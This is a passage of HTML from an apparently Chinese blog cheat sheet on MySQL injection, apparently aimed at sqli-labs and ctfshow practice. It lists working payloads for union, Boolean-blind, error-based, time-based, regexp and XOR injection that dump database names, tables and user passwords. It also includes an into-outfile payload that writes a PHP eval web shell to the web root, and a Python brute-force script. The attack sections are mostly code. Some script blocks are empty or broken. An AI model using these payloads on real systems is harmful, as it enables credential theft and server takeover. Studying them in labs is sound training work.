class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">distinct</span> 去重</span><br><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"></span><br><span class="line"># 语句执行顺序</span><br><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> </span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inner join</span></span><br><span class="line">select a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment"># left/right join</span></span><br><span class="line">select dname,ename from dept a left join emp b on a.deptno=b.deptno;</span><br></pre></td></tr></table></figure><h2 id="四、union-联合注入-单引号闭合字符型为例"><a href="#四、union-联合注入-单引号闭合字符型为例" class="headerlink" title="四、union 联合注入(单引号闭合字符型为例)"></a>四、union 联合注入(单引号闭合字符型为例)</h2><p>注入判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>order by 查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; order by x--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by x<span class="comment">#</span></span><br><span class="line"><span class="comment"># 其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释</span></span><br></pre></td></tr></table></figure><p>判断回显位置，三列为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span> union select 1,2,3--+</span><br><span class="line">?id=1<span class="string">&#x27; and 1=2 union select 1,2,3--+</span></span><br><span class="line"><span class="string"># 前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1 </span></span><br><span class="line"><span class="string"># 这样就无法查看到我们想要的信息了</span></span><br></pre></td></tr></table></figure><p>回显位置注入 sql 语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select database()),3--+</span></span><br></pre></td></tr></table></figure><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure><p>查某一个库中的表</p><p><code>注意：仅仅是查当前数据库 database() 的表，由于处于当前数据库下，是不能查看其它数据库中数据的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>查内容，<code>~</code> 连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(concat_ws(&#x27;</span>~<span class="string">&#x27;,username,password))from security.users),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 同时查三列数据的话</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,group_concat(id,<span class="string">&#x27;--&#x27;</span>,username,<span class="string">&#x27;--&#x27;</span>,password),3 from users<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h2><h3 id="5-1-手动：结合-Burp-爆破进行"><a href="#5-1-手动：结合-Burp-爆破进行" class="headerlink" title="5.1 手动：结合 Burp 爆破进行"></a>5.1 手动：结合 Burp 爆破进行</h3><p>查数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and length(database())=1--+</span></span><br><span class="line"><span class="string"># 爆破数字 1</span></span><br></pre></td></tr></table></figure><p>判断库名组成     security</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and left(database(),1)=&#x27;</span>a<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破字母 a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr(database(),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查表         users</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit a,1),1,1)) =&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure><p>查列        username   password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit a,1),1,1)) = &#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure><p>查内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破 ascii 值 b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select password from security.users <span class="built_in">limit</span> 0,1),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="5-2-脚本"><a href="#5-2-脚本" class="headerlink" title="5.2 脚本"></a>5.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h2><p><strong>利用条件</strong>：页面回显 SQL语句执行的错误信息，例如 <code>mysql_error()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">floor</span>()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># extractvalue()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</span><br></pre></td></tr></table></figure><p><strong>updatexml()</strong> 函数：</p><p>这个函数的第二个参数本应该是合法的 <code>XPATH</code> 路径，否则就会在引发报错的同时将传入的参数进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个参数即可查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># updatexml()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">exp</span>()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">EXP</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 六种函数 (使用方法相同)</span><br><span class="line"></span><br><span class="line">GeometryCollection()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h2 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h2><h3 id="7-1-手动"><a href="#7-1-手动" class="headerlink" title="7.1 手动"></a>7.1 手动</h3><p><strong>写文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,&quot;&lt;?php @eval(\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+</span></span><br><span class="line"><span class="string"># 可将文件内容转换成十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span>--+</span><br></pre></td></tr></table></figure><p><strong>有回显时 读取文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string"># 文件路径 可使用 十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+</span><br></pre></td></tr></table></figure><p><strong>无回显 盲注读取文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; and ascii(mid((select hex(load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;))),a,1))&gt;b--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="7-2-脚本"><a href="#7-2-脚本" class="headerlink" title="7.2 脚本"></a>7.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 八、延时注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 8.1 手动：结合 Burp Respond</span></span><br><span class="line"></span><br><span class="line">当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，可考虑延时注入。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">?id=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(length(database())=a,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 爆破数字 a</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr(database(),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="8-2-脚本"><a href="#8-2-脚本" class="headerlink" title="8.2 脚本"></a>8.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 九、regexp 正则匹配</span></span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;b$&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  1 | Dumb     | Dumb      |</span><br><span class="line">|  3 | Dummy    | p@ssword  |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  8 | admin    | admin     |</span><br><span class="line">|  9 | admin1   | admin1    |</span><br><span class="line">| 10 | admin2   | admin2    |</span><br><span class="line">| 11 | admin3   | admin3    |</span><br><span class="line">| 12 | dhakkan  | dumbo     |</span><br><span class="line">| 14 | admin4   | admin4    |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;^a&#x27;</span>;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;admin[0-9]&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;.n&#x27;</span>;<span class="comment">#.匹配任意字符</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;a|b&#x27;</span>;  <span class="comment">#含有 a 或 b 的</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="9-1-手动"><a href="#9-1-手动" class="headerlink" title="9.1 手动"></a>9.1 手动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;</span>b<span class="string">&#x27;),1,2)=&#x27;</span>1</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 字母 b</span></span><br></pre></td></tr></table></figure><h3 id="9-2-脚本"><a href="#9-2-脚本" class="headerlink" title="9.2 脚本"></a>9.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxxx&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,45):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        </span><br><span class="line">        payload = f<span class="string">&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                <span class="built_in">exit</span>(0)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="十、异或注入"><a href="#十、异或注入" class="headerlink" title="十、异或注入"></a>十、异或注入</h2><p><strong>异或</strong>：一种逻辑运算，简言之，<strong>相同为假，不同为真，NULL 与任何条件欲火结果都为 NULL</strong>，mysql 中的符号是 <strong>^  和 xor</strong>。</p><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 